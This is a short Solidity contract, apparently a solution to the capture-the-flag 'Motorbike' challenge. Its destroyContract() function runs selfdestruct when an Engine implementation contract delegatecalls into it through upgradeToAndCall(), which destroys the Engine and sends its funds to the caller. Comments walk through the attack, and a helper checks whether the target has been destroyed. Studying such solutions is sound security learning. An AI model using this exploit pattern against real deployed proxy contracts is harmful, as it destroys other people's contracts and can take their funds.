// SPDX-License-Identifier: MIT

pragma solidity <0.7.0;

contract AttackMotorbike {

  bool public destroyed = false;

  // When the upgradeToAndCall() on the Engine contract is executed, it will delegate a call to this Attacker contract executing the destroyContract()
    // As a result, the selfdestruct() will be executed on the context of the Engine contract
  function destroyContract() public {
    // send the funds of the Engine contract to the caller
    selfdestruct(payable(msg.sender));
  }

  // Validate if the Engine contract was selfdestruct
  function contractExists(address _contract) public returns (bool) {
    uint size;
    assembly {
        size := extcodesize(_contract)
    }
    // If the Engine contract was deleted, destroyed variable will be set as true / If size is greather than 0 it means that the contract was not destroyed!
    destroyed = !(size > 0);
    return size > 0;
  }

}